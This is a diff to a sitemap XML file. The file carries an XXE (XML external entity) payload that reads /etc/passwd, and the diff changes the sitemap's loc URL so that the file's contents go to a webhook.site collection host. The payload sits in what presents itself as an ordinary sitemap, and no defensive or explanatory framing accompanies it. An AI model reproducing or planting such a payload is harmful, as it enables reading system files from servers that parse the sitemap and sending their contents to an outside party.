@@ -1,9 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
     <url>
-        <loc>https://w41test.vercel.app/?=&xxe;</loc>
+        <loc>https://webhook.site/d7fb7b91-901d-426b-89b0-953b4de01402/?abc=&xxe;</loc>
         <lastmod>2025-07-30</lastmod>
         <changefreq>daily</changefreq>
         <priority>1.0</priority>
